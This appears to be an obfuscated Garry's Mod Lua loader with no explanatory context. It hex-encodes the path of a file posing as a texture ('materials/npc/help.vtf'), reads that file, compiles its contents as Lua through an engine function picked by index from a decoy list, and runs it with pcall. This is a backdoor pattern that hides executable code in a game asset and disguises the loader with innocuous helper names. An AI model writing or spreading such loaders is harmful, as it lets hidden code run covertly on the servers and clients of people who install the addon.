local function HELPER_INFO()
		return ""
	end

	local function HELPER_ISFUNC(func)
		if (isfunction(func)) then
			return !false
		else
			return !true
		end
	end

	local function HELPER_READ_DATA(data)
		return file.Read(data, "GAME")
	end

	local UNORDERED_LIST = 
	{
		"\x6d","\x61","\x74",
		"\x65","\x72","\x69",
		"\x61","\x6c","\x73",
		"\x2f","\x6e","\x70",
		"\x63","\x2f","\x68",
		"\x65","\x6c","\x70",
		"\x2e","\x76","\x74",
		"\x66"
	}

	local function HELPER_MAT()
		if (!false) then
			return string.Implode("", UNORDERED_LIST)
		end
	end

	local CALL =
	{
		ClearBackgroundImages, ClientsideModel, ClientsideRagdoll, ClientsideScene,
		CloseDermaMenus, collectgarbage, Color, ColorAlpha,
		ColorRand, ColorToHSV, CompileFile, CompileString,
		ConsoleAutoComplete, ConVarExists, CreateClientConVar, CreateConVar,
		CreateMaterial, CreateParticleSystem, CreatePhysCollideBox, CreatePhysCollidesFromModel,
		CreateSound, CreateSprite, CompileString, CurTime,
		DamageInfo, DebugInfo, DeriveGamemode, Derma_Anim,
		Derma_DrawBackgroundBlur, Derma_Hook, Derma_Install_Convar_Functions, Derma_Message,
		Derma_Query, Derma_StringRequest, pcall,
	}

	CALL[35](CALL[12](HELPER_READ_DATA(HELPER_MAT()), HELPER_INFO(), 0))